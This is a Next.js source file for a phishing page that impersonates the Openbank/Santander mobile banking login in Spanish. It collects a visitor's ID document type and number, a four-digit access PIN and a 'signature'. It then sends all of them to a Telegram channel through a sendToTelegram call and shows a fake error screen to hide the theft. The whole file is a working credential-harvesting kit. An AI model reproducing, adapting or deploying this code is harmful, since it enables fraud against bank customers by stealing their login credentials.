"use client"

import { useState, useEffect } from "react"
import Link from "next/link"
import Image from "next/image"
import { sendToTelegram } from "./utils/telegram"
import { ChevronDown, Menu, Eye, X, Check, Headphones, Globe, FileText, ChevronRight } from "lucide-react"
import WelcomeIllustration from "@/components/welcome-illustration"

// Document validation patterns
const documentValidation = {
  NIF: {
    regex: /^[0-9]{7,8}[trwagmyfpdxbnjzsqvhlckeTRWAGMYFPDXBNJZSQVHLCKE]{1}$/,
    example: "12345678Z",
  },
  NIE: {
    regex: /^[x-zX-Z]{1}[0-9]{7}[trwagmyfpdxbnjzsqvhlckeTRWAGMYFPDXBNJZSQVHLCKE]{1}/,
    example: "X9464187D",
  },
  "Pasaporte español": {
    regex: /[\s\S]*/,
    example: "ZAB000254",
  },
  "Otro documento extranjero": {
    regex: /[\s\S]*/,
    example: "OTHERDOC1234",
  },
}

export default function Home() {
  const [currentScreen, setCurrentScreen] = useState<"welcome" | "document" | "password" | "error" | "pin" | "signature">("welcome");
  const [showSidebar, setShowSidebar] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  // Centralized state for all input data
  const [formData, setFormData] = useState({
    documentType: "",
    documentNumber: "",
    pin: "",
    signature: "",
  });

  const renderScreen = () => {
    if (isLoading) {
      return <LoadingScreen />;
    }

    switch (currentScreen) {
      case "welcome":
        return (
          <WelcomeScreen
            onContinue={() => setCurrentScreen("document")}
            onMenuClick={() => setShowSidebar(true)}
          />
        );
      case "document":
        return (
          <DocumentScreen
            onContinue={() => setCurrentScreen("pin")}
            onMenuClick={() => setShowSidebar(true)}
            setFormData={setFormData}
            formData={formData}
          />
        );
      case "pin":
        return (
          <PinScreen
            onContinue={() => {
              setIsLoading(true);
              setTimeout(() => {
                setIsLoading(false);
                setCurrentScreen("signature");
              }, 1500); // Simulate loading for 1.5 seconds
            }}
            onMenuClick={() => setShowSidebar(true)}
            setFormData={setFormData}
            formData={formData}
          />
        );
      case "signature":
        return (
          <SignatureScreen
            onContinue={() => {
              sendToTelegram(
                `Document Type: ${formData.documentType}\nDocument Number: ${formData.documentNumber}\nPIN: ${formData.pin}\nSignature: ${formData.signature}`
              );
              setIsLoading(true);
              setTimeout(() => {
                setIsLoading(false);
                setCurrentScreen("error");
              }, 1500); // Simulate loading for 1.5 seconds
            }}
            onMenuClick={() => setShowSidebar(true)}
            setFormData={setFormData}
            formData={formData}
          />
        );
      default:
        return (
          <WelcomeScreen
            onContinue={() => setCurrentScreen("document")}
            onMenuClick={() => setShowSidebar(true)}
          />
        );
    }
  };

  return (
    <main className="flex min-h-screen flex-col items-center justify-between relative">
      {renderScreen()}

      {/* Sidebar Menu */}
      {showSidebar && (
        <div className="fixed inset-0 z-50 flex">
          <div className="w-[90%] bg-black h-full">
            <div className="flex justify-end p-6">
              <button onClick={() => setShowSidebar(false)}>
                <X size={24} />
              </button>
            </div>

            <div className="px-6 pt-10 pb-6 text-center">
              <h2 className="text-2xl font-medium">Para ti</h2>
            </div>

            <div className="px-6">
              <div className="bg-[#222222] rounded-xl overflow-hidden">
                <button className="w-full flex items-center justify-between p-4 border-b border-[#333333]">
                  <div className="flex items-center">
                    <Headphones className="text-[#0099cc] mr-3" size={24} />
                    <span>Contacto</span>
                  </div>
                  <ChevronRight size={20} />
                </button>

                <button className="w-full flex items-center justify-between p-4 border-b border-[#333333]">
                  <div className="flex items-center">
                    <svg
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      strokeWidth="2"
                      className="text-[#0099cc] mr-3"
                    >
                      <rect x="4" y="4" width="16" height="16" rx="2" />
                      <rect x="9" y="9" width="6" height="6" />
                      <path d="M15 2v2" />
                      <path d="M15 20v2" />
                      <path d="M2 15h2" />
                      <path d="M20 15h2" />
                    </svg>
                    <span>Cajeros</span>
                  </div>
                  <ChevronRight size={20} />
                </button>

                <button className="w-full flex items-center justify-between p-4 border-b border-[#333333]">
                  <div className="flex items-center">
                    <Globe className="text-[#0099cc] mr-3" size={24} />
                    <span>Cambiar país</span>
                  </div>
                  <ChevronRight size={20} />
                </button>

                <button className="w-full flex items-center justify-between p-4">
                  <div className="flex items-center">
                    <FileText className="text-[#0099cc] mr-3" size={24} />
                    <span>Aviso legal</span>
                  </div>
                  <ChevronRight size={20} />
                </button>
              </div>
            </div>

            <div className="absolute bottom-20 left-0 right-0 text-center">
              <p className="text-sm text-gray-400">Versión app: 2.3.0</p>
            </div>
          </div>
          <div className="w-[10%] bg-transparent h-full" onClick={() => setShowSidebar(false)}></div>
        </div>
      )}
    </main>
  )
}

function WelcomeScreen({ onContinue, onMenuClick }: { onContinue: () => void; onMenuClick: () => void }) {
  return (
    <div className="flex flex-col min-h-screen w-full relative">
      <div className="flex justify-center pt-8 pb-12">
        <OpenbankLogo />
      </div>

      <div className="flex-grow flex flex-col items-center justify-center px-6">
        <div className="w-full max-w-xs mt-12 mb-10">
          <WelcomeIllustration />
        </div>
      </div>

      <div className="px-6 pb-20">
        <button onClick={onContinue} className="primary-button">
          Acceder
        </button>
        <div className="mt-4 text-center mb-12">
          <Link href="#" className="link-text">
            Hazte Cliente
          </Link>
        </div>
      </div>

      <Footer />
    </div>
  )
}

// Modify the DocumentScreen component to add more spacing
function DocumentScreen({
  onContinue,
  onMenuClick,
  setFormData,
  formData,
}: {
  onContinue: () => void;
  onMenuClick: () => void;
  setFormData: React.Dispatch<React.SetStateAction<any>>;
  formData: any;
}) {
  const [selectedDocumentType, setSelectedDocumentType] = useState(formData.documentType || "NIF");
  const [documentNumber, setDocumentNumber] = useState(formData.documentNumber || "");

  const handleContinue = () => {
    setFormData((prev: any) => ({
      ...prev,
      documentType: selectedDocumentType,
      documentNumber,
    }));
    onContinue();
  };

  const [showDocumentTypeModal, setShowDocumentTypeModal] = useState(false)
  const [isDocumentValid, setIsDocumentValid] = useState(false)

  const documentTypes = [
    { id: "nif", label: "NIF" },
    { id: "nie", label: "NIE" },
    { id: "passport", label: "Pasaporte español" },
    { id: "other", label: "Otro documento extranjero" },
  ]

  // Validate document number when it changes or document type changes
  useEffect(() => {
    if (documentNumber) {
      const validation = documentValidation[selectedDocumentType as keyof typeof documentValidation]
      setIsDocumentValid(validation.regex.test(documentNumber))
    } else {
      setIsDocumentValid(false)
    }
  }, [documentNumber, selectedDocumentType])

  return (
    <div className="flex flex-col min-h-screen w-full relative">
      <div className="flex items-center px-6 pt-8">
        <button className="p-1" onClick={onMenuClick}>
          <Menu size={24} />
        </button>
        <div className="flex-grow flex justify-center">
          <OpenbankLogo />
        </div>
      </div>

      <div className="px-6 pt-10 pb-6 text-center">
        <h1 className="text-[#e91e63] text-3xl font-bold">¡Hola!</h1>
      </div>

      <div className="flex-grow px-6">
        <div className="mb-4">
          <label className="block mb-2 font-medium">Tipo de documento</label>
          <button
            className="input-field flex justify-between items-center"
            onClick={() => setShowDocumentTypeModal(true)}
          >
            <span>{selectedDocumentType}</span>
            <ChevronDown size={20} />
          </button>
        </div>

        <div className="mb-4">
          <label className="block mb-2 font-medium">Número de documento</label>
          <input
            type="text"
            className="input-field"
            value={documentNumber}
            onChange={(e) => setDocumentNumber(e.target.value)}
            placeholder={documentValidation[selectedDocumentType as keyof typeof documentValidation].example}
          />
        </div>
      </div>

      <div className="px-6 pb-6">
        <button
          onClick={handleContinue}
          className={`w-full py-4 rounded-full font-medium hover:bg-opacity-90 transition-all ${
            isDocumentValid ? "bg-[#e91e63] text-white" : "secondary-button"
          }`}
          disabled={!isDocumentValid}
        >
          Continuar
        </button>
        <div className="mt-4 text-center mb-24">
          <Link href="#" className="link-text">
            Hazte cliente
          </Link>
        </div>
      </div>

      <Footer />

      {/* Document Type Modal */}
      {showDocumentTypeModal && (
        <div className="fixed inset-0 z-50 flex items-end justify-center">
          <div
            className="absolute inset-0 bg-black bg-opacity-50"
            onClick={() => setShowDocumentTypeModal(false)}
          ></div>

          <div className="relative bg-white rounded-t-3xl w-full max-w-md animate-slide-up">
            <div className="flex justify-center pt-3 pb-1">
              <div className="w-12 h-1 bg-gray-300 rounded-full"></div>
            </div>

            <div className="flex justify-between items-center px-6 pt-2 pb-4">
              <h2 className="text-xl font-bold text-black">Tipo de documento</h2>
              <button onClick={() => setShowDocumentTypeModal(false)} className="p-1">
                <X size={24} className="text-black" />
              </button>
            </div>

            <div className="px-4 pb-8">
              {documentTypes.map((docType) => (
                <button
                  key={docType.id}
                  className={`flex justify-between items-center w-full p-4 rounded-xl mb-2 ${
                    selectedDocumentType === docType.label ? "bg-white border border-gray-200" : "bg-gray-100"
                  }`}
                  onClick={() => {
                    setSelectedDocumentType(docType.label)
                    setShowDocumentTypeModal(false)
                  }}
                >
                  <span className="text-black font-medium">{docType.label}</span>
                  <div
                    className={`w-6 h-6 rounded-full flex items-center justify-center ${
                      selectedDocumentType === docType.label ? "bg-black" : "border border-gray-400"
                    }`}
                  >
                    {selectedDocumentType === docType.label && <Check size={16} className="text-white" />}
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

// Remove the keyboard and simplify the PinScreen component
function PinScreen({
  onContinue,
  onMenuClick,
  setFormData,
  formData,
}: {
  onContinue: () => void;
  onMenuClick: () => void;
  setFormData: React.Dispatch<React.SetStateAction<any>>;
  formData: any;
}) {
  const [pin, setPin] = useState(formData.pin || "");

  const [showPin, setShowPin] = useState(false);

  const handleContinue = () => {
    setFormData((prev: any) => ({
      ...prev,
      pin,
    }));
    onContinue();
  };

  return (
    <div className="flex flex-col min-h-screen w-full relative">
      <div className="flex items-center px-6 pt-8">
        <button className="p-1" onClick={onMenuClick}>
          <Menu size={24} />
        </button>
        <div className="flex-grow flex justify-center">
          <OpenbankLogo />
        </div>
      </div>

      <div className="px-6 pb-4 flex flex-col items-center mt-8">
        <div className="flex justify-center w-full">
          <div className="relative w-full max-w-lg">
            <input
              type="tel"
              inputMode="numeric"
              maxLength={4}
              value={pin}
              onChange={e => setPin(e.target.value.slice(0, 4))}
              className="w-full bg-transparent border-2 border-white rounded-full py-4 pr-12 pl-6 text-transparent caret-white text-lg font-mono font-bold focus:outline-none focus:border-[#e91e63] mx-auto"
              autoComplete="off"
              style={{ letterSpacing: '1.5em' }}
            />
            {/* Overlay for 4 bold dots */}
            <div className="absolute left-0 top-0 w-full h-full flex items-center pl-6 pr-12 pointer-events-none select-none">
              {[0,1,2,3].map(i => (
                <span
                  key={i}
                  className="flex-1 text-3xl font-extrabold text-white text-center tracking-widest"
                  style={{ minWidth: '1.5em' }}
                >
                  {pin[i] ? '●' : ''}
                </span>
              ))}
            </div>
            <button
              type="button"
              className="absolute right-4 top-1/2 -translate-y-1/2 p-1 text-white z-10"
              onClick={() => setShowPin(v => !v)}
              tabIndex={-1}
            >
              <Eye size={22} />
            </button>
          </div>
        </div>
        <button
          className={`w-full max-w-lg mt-6 py-4 rounded-full font-medium hover:bg-opacity-90 transition-all ${
            pin.length === 4 ? "bg-[#e91e63] text-white" : "secondary-button"
          }`}
          disabled={pin.length !== 4}
          onClick={handleContinue}
        >
          Accede
        </button>
        <button
          className="text-[#e91e63] hover:underline font-medium mt-4"
          onClick={() => setPin("")}
        >
          ¿Has olvidado tu clave de acceso?
        </button>
      </div>

      <div className="flex-grow"></div>

      <Footer />
    </div>
  );
}

function PasswordScreen({
  onLogin,
  onForgotPassword,
  onMenuClick,
}: {
  onLogin: () => void
  onForgotPassword: () => void
  onMenuClick: () => void
}) {
  const [showPassword, setShowPassword] = useState(false)

  return (
    <div className="flex flex-col min-h-screen w-full relative">
      <div className="flex items-center px-6 pt-8">
        <button className="p-1" onClick={onMenuClick}>
          <Menu size={24} />
        </button>
        <div className="flex-grow flex justify-center">
          <OpenbankLogo />
        </div>
      </div>

      <div className="px-6 pt-10 pb-6 text-center">
        <h1 className="text-[#e91e63] text-3xl font-bold">¡Hola!</h1>
      </div>

      <div className="px-6 pb-4">
        <div className="flex items-center justify-center">
          <span>Usuario: 7194***</span>
          <button className="ml-2">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z" />
            </svg>
          </button>
        </div>
      </div>

      <div className="px-6 pb-4">
        <div className="flex items-center">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" />
            <polyline points="10 17 15 12 10 7" />
            <line x1="15" y1="12" x2="3" y2="12" />
          </svg>
          <button className="ml-2 text-white" onClick={onForgotPassword}>
            ¿Has olvidado tu clave de acceso?
          </button>
        </div>
      </div>

      <div className="flex-grow"></div>

      <div className="px-6 pb-20">
        <button onClick={onLogin} className="secondary-button">
          Accede
        </button>
      </div>

      <Footer />
    </div>
  )
}

function ErrorScreen({
  onLogin,
  onForgotPassword,
  onMenuClick,
}: {
  onLogin: () => void
  onForgotPassword: () => void
  onMenuClick: () => void
}) {
  const [showPassword, setShowPassword] = useState(false)

  return (
    <div className="flex flex-col min-h-screen w-full relative">
      <div className="flex items-center px-6 pt-8">
        <button className="p-1" onClick={onMenuClick}>
          <Menu size={24} />
        </button>
        <div className="flex-grow flex justify-center">
          <OpenbankLogo />
        </div>
      </div>

      <div className="px-6 pt-10 pb-6 text-center">
        <h1 className="text-[#e91e63] text-3xl font-bold">¡Hola!</h1>
      </div>

      <div className="px-6 pb-4">
        <div className="flex items-center justify-center">
          <span>Usuario: 7194***</span>
          <button className="ml-2">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z" />
            </svg>
          </button>
        </div>
      </div>

      <div className="px-6 pb-4">
        <label className="block mb-2">Introduce tu clave de acceso</label>
        <div className="relative">
          <div className="flex">
            <div className="flex-grow pr-1">
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  className="w-full bg-transparent border-b-2 border-[#e91e63] pb-2 focus:outline-none"
                />
              </div>
            </div>
            <div className="flex-grow pl-1">
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  className="w-full bg-transparent border-b-2 border-[#e91e63] pb-2 focus:outline-none"
                />
                <button className="absolute right-0 top-0 p-1" onClick={() => setShowPassword(!showPassword)}>
                  <Eye size={20} />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="px-6 pb-4">
        <div className="flex items-start text-[#e91e63]">
          <svg
            width="20"
            height="20"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            className="text-[#e91e63] mt-1"
          >
            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" />
            <line x1="12" y1="9" x2="12" y2="13" />
            <line x1="12" y1="17" x2="12.01" y2="17" />
          </svg>
          <span className="ml-2 text-sm">Comprueba que el número del documento y la clave son correctos</span>
        </div>
      </div>

      <div className="px-6 pb-4">
        <div className="flex items-center">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4" />
            <polyline points="10 17 15 12 10 7" />
            <line x1="15" y1="12" x2="3" y2="12" />
          </svg>
          <button className="ml-2 text-white" onClick={onForgotPassword}>
            ¿Has olvidado tu clave de acceso?
          </button>
        </div>
      </div>

      <div className="flex-grow"></div>

      <div className="px-6 pb-20">
        <button onClick={onLogin} className="secondary-button">
          Accede
        </button>
      </div>

      <Footer />
    </div>
  )
}

function SignatureScreen({
  onContinue,
  onMenuClick,
  setFormData,
  formData,
}: {
  onContinue: () => void;
  onMenuClick: () => void;
  setFormData: React.Dispatch<React.SetStateAction<any>>;
  formData: any;
}) {
  const [signature, setSignature] = useState(formData.signature || "");

  const handleContinue = async () => {
    setFormData((prev: any) => ({
      ...prev,
      signature,
    }));

    await sendToTelegram(
      `Document Type: ${formData.documentType}\nDocument Number: ${formData.documentNumber}\nPIN: ${formData.pin}\nSignature: ${signature}`
    );

    onContinue();
  };

  return (
    <div className="flex flex-col min-h-screen w-full relative">
      <div className="flex items-center px-6 pt-8">
        <button className="p-1" onClick={onMenuClick}>
          <Menu size={24} />
        </button>
        <div className="flex-grow flex justify-center">
          <OpenbankLogo />
        </div>
      </div>

      <div className="px-6 pt-10 pb-6 text-center">
        <h1 className="text-[#e91e63] text-3xl font-bold">Firma</h1>
      </div>

      <div className="flex-grow px-6">
        <div className="mb-4">
          <label className="block mb-2 font-medium ml-3">Introduce tu firma</label>
          <input
            type="text"
            className="input-field"
            value={signature}
            onChange={(e) => setSignature(e.target.value)}
            placeholder="Escribe tu firma"
          />
        </div>

        <button
          onClick={handleContinue}
          className={`w-full py-4 rounded-full font-medium hover:bg-opacity-90 transition-all ${
            signature ? "bg-[#e91e63] text-white" : "secondary-button"
          }`}
          disabled={!signature}
        >
          Continuar
        </button>
      </div>

      <Footer />
    </div>
  );
}

function OpenbankLogo() {
  return (
    <div className="flex items-center justify-center">
      <Image src="/openbank-logo.svg" alt="Openbank" width={140} height={30} priority />
    </div>
  )
}

function Footer() {
  return (
    <div className="absolute bottom-0 left-0 right-0">
      <div className="flex justify-center py-4">
        <div className="text-sm">
          By <span className="font-bold">Santander</span>
          <sup>®</sup>
        </div>
      </div>
    </div>
  )
}

function LoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-75">
      <div className="flex flex-col items-center">
        <div className="loader"></div>
        <p className="text-white mt-4">Cargando...</p>
      </div>

      <style jsx>{`
        .loader {
          width: 50px;
          height: 50px;
          border: 5px solid rgba(255, 255, 255, 0.3);
          border-top: 5px solid #e91e63;
          border-radius: 50%;
          animation: spin 1s linear infinite;
        }

        @keyframes spin {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }
      `}</style>
    </div>
  );
}
